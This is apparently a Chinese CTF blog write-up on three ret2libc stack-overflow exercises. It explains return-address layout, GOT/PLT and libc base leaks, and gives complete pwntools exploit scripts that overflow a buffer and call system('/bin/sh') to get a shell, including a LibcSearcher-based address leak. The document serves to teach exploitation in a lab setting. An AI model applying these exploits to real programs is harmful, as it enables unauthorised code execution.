---
title:  学习pwn小记(2)
categories: [CTF]
tags: [pwn]

---

在研究ret2libc时,耗费几天时间去理解学习。感觉在了解ret2libc技术的同时更多的还是学习到一些调试与编写的技术以及解决了我的一些疑惑，故写文以记之。
<!-- more -->
## ret2libc1

在做这一道题时,checksec下

![image-20200914161838576](image-20200914161838576.png)

发现还是开了NX，打开ida反序列化。发现有gets函数猜测有栈溢出，又发现有system函数但调用时不是system('/bin/sh').但在ida中找到了'/bin/sh'.又由于调用了，猜测plt表里有system。于是思路就清晰了，用plt里system来调用‘/bin/sh’。于是得到exp：

```python
from pwn import*

context.terminal = ['tmux', 'splitw', '-h']
p=process('./ret2libc1')
e=ELF('./ret2libc1')
pay='a'*112+p32(e.plt['system'])+p32(0)+p32(0x08048720)
p.sendline(pay)
p.interactive()   
```

在写这个exp时，套用了之前大佬的脚本但一直纳闷为什么在payload要system后加4个字符（‘p32(0)’）？

在学习某大佬的[/return2libc学习笔记](https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html)后，豁然开朗。其实我们payload的作用，大概如下图所示：

![image-20200914223959660](image-20200914223959660.png)

在溢出数据后，使用libc库中system函数的地址覆盖掉原本的返回地址（这样原函数返回的时候会转而调用system函数），然后跟着是返回地址、参数。所以我们的system后加**4个字符（‘p32(0)’）在图中的‘Filler’的位置指代是返回地址**。

那么跟的问题也来了，为什么Filler’的位置('p(0)')指代是返回地址？为什么参数跟在返回地址后面？

正常情况下，我们是通过call指令进行函数调用的，因此在进入到system函数之前，call指令已经通过push EIP将其返回地址push到栈帧中了，所以在正常情况下ret指令pop到EIP的数据就是之前call指令push到栈帧的数据，也就是说两者是成对的。但是在我们的利用漏洞攻击中，直接通过覆盖EIP地址跳转到了system函数，而并没有经过call调用，也即是没有push EIP的操作，但是system函数却照常进行了ret指令的pop EIP操作。此时的ESP指向了Filler，所以根据栈的‘后进先出’的原则在栈顶（ESP）的Filler会被pop出保存在EIP中。而EIP作用是保存的是返回地址，所以Filler就成了返回地址。

![image-20200915113940247](image-20200915113940247.png)

同时我们在进行漏洞攻击中，与正常函数相比就只少了‘进入到system函数之前，call指令已经通过push EIP将其返回地址push到栈帧中’这一步骤，因此参数还是正常的跟在返回地址后面。

## ret2libc2

刚做这道题看着ctf-wiki的讲解,有的蒙.因为在ret2libc1的基础上没有'/bin/sh'，然后看着上面给的exp也，没怎么看懂。自己照着[return2libc学习笔记](https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html)的思路走的（但也还是不少的弯子）。

![image-20200915201444197](image-20200915201444197.png)

想调用system（'/bin/sh'）,但是想要一个地方储‘/bin/sh‘于是找到buf可以读写执行。于是想用个方法写’/bin/sh‘到buf。再调用在范围地址那调用EIP。开始短路了,想着用scanf然后发现自己tcl不懂参数，于是看了下大佬的解析用了get函数。于是大体思路就成：溢出调用get将’/bin/sh‘写入bss中的buf，再将返回地址指向system，并将buf传入system。

```python
from pwn import *

p=process('./ret2libc2')

e=ELF('./ret2libc2')
pay='a'*112+p32(e.plt['gets'])+p32(e.plt['system'])+p32(0x0804A080)+p32(0x0804A080)
p.sendline(pay)
p.sendline('/bin/sh')
p.interactive()   
```

做到这里时，我产生几个疑问：

1）gets为什么能将数据写入buf？

gets函数的作用是将接收到的数据写入参数中。我们将buf地址作为参数传入gets函数，gets函数将数据写入buf地址对应空间。

2）system为什么不跟上返回地址再加参数?

在通过第一次ret2libc调用到system时，system是正常调用的。所以在调用时不需更上返回地址。可以看到进入system后esp指向的就是第一个参数。

![image-20200915204940834](image-20200915204940834.png)

3）ctf-wiki中的payload的写法是什么？

payload的写法是溢出数据+get地址+edx地址+duf地址+system地址+返回地址+buf地址

按个人理解改写那种思路exp如下：

```python
from pwn import*

p=process('./ret2libc2')

e=ELF('./ret2libc2')
pay='a'*112+p32(e.plt['gets'])+p32(0x0804843d)+p32(0x0804A080)+p32(e.plt['system'])+p32(0)+p32(0x0804A080)
p.sendline(pay)
p.sendline('/bin/sh')
p.interactive()   
```

EDX处命令相当于： pop edx；ret；

而：

> CPU在执行call指令时需要进行两步操作:
>
> 1.将当前的IP(也就是函数返回地址)入栈，即：push EIP;
>
> 2.跳转，即： jmp dword ptr 内存单元地址。
>
> CPU在执行ret指令时只需要恢复IP寄存器即可，因此ret指令相当于pop EIP

所以system地址会pop入EIP运行。

经过gdb，在ebx返回时，esp指向的是system。ret则是将system pop入EIP。证明这个是可行的

![image-20200915220654816](image-20200915220654816.png)

## ret2libc3

ret2libc2 的基础上，再次将 system 函数的地址去掉。我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。程序保护如下:

![image-20200915231136645](image-20200915231136645.png)

nx打开导致我们无法直接写入shell执行。

在这里有个知识点吧：

system函数属于libc，而libc.so动态链接库中的函数之间的相对偏移是固定的，也就是说要找基地址，则有公式：**A真实地址-A的偏移地址 = B真实地址-B的偏移地址 = 基地址**。

由于libc的延迟绑定机制，我们需要泄漏已经执行过的函数的地址，已经执行过的话就会在got表生存下来，有了真实的地址的信息。

![image-20200915232459322](image-20200915232459322.png)

发现程序之前调用了puts与printf函数，因此我们可以：

puts真实地址-puts的偏移地址  = 基地址= system真实地址-system的偏移地址

但是再仔细找文件，发现没给libc文件信息。

这里又用到一个知识点：

即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，**最低的 12 位并不会发生改变**。如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。

```python
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
import pwnlib

context.terminal = ['tmux', 'splitw', '-h']
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']#我们需要用put输出在服务器端的实际地址
puts_got = ret2libc3.got['puts']#得到puts的got的地址，这个地址里的数据即函数的真实地址，即我们要泄露的对象
main = ret2libc3.symbols['main']#返回地址被覆盖为main函数的地址，再次执行main，以求再次溢出

print "leak puts_got addr and return to main again"
payload = 'a' * 112+ p32(puts_plt)+p32(main)+p32( puts_got)
sh.sendlineafter('Can you find it !?', payload)

print "get the related addr"
puts_addr = u32(sh.recv()[0:4])#交互时接受返回的在libc中的真实地址，由于是32位的文件，recv(4)是指只接收四个字节的信息，因为泄露的地址信息只存在于前四个字节，u32是指解包unpack，将一块数据解包成四个字节
libc = LibcSearcher('puts', puts_addr)
libcbase = puts_addr - libc.dump('puts')#通过偏移计算出基地址
#gdb.attach(sh,"b *puts")
system_addr = libcbase + libc.dump('system')#通过基地址，算出system在libc中的真实地址
binsh_addr = libcbase + libc.dump('str_bin_sh')#通过基地址，算出/bin/sh在libc中的真实地址

print "get shell"

payload='a'*104+p32(system_addr)+p32(0)+p32(binsh_addr)
sh.sendline(payload)

sh.interactive()
```

然后这个我踩过两个坑:

1)got地址及libc中的真实地址之间的关系.

got表里存放了libc函数的真实地址,而got地址是指的got的某一个空间的地址.这某一个空间里存放着我们要的真实地址.

2)第二次溢出的数据为104个字符.一次运行main时栈大小有108,而第二次栈大小只有有100多.

第一次:

![image-20200916092210173](image-20200916092210173.png)

第二次:

![image-20200916092338372](image-20200916092338372.png)

然后看下dl在wiki的留言:

> 发现start函数有一句and esp, 0FFFFFFF0h进行了堆栈平衡，可以自己写个demo试一下，在and语句之前，esp的值是0xffffade8，而经过and之后，esp的值就变为了0xffffade0。所以问题就出在 _start函数的and语句，要是直接返回main函数就相当于少了一个and操作，esp的位置也就多了8。（栈的内存增长相反，即栈空间少了8）

像是因为_start函数做了堆栈平衡,然我们第二次调用main没有做.所以esp多了8.

![image-20200916101954834](image-20200916101954834.png)

于是改exp:

```python
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
import pwnlib

context.terminal = ['tmux', 'splitw', '-h']
sh = process('./ret2libc3')
gdb.attach(sh)
ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']
puts_got = ret2libc3.got['puts']
main = ret2libc3.symbols['_start']

print "leak puts_got addr and return to main again"
payload = 'a' * 112+ p32(puts_plt)+p32(main)+p32( puts_got)
sh.sendlineafter('Can you find it !?', payload)

print "get the related addr"
puts_addr = u32(sh.recv()[0:4])
print 'puts_addr:'+hex(puts_addr)
print 'puts_got:'+hex(puts_got)
print 'puts_plt:'+hex(puts_plt)
libc = LibcSearcher('puts', puts_addr)
libcbase = puts_addr - libc.dump('puts')

system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print "get shell"

payload='a'*104+'abcdefgh'+p32(system_addr)+p32(0)+p32(binsh_addr)
sh.sendline(payload)

sh.interactive()
```



gdb 第一次执行get后栈:

![image-20200916102207673](image-20200916102207673.png)

gdb 第二次执行get后栈:

![image-20200916103121220](image-20200916103121220.png)





## 参考资料

https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html

https://www.jianshu.com/p/4928e726a43f

https://blog.csdn.net/qq_41918771/article/details/90665950

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/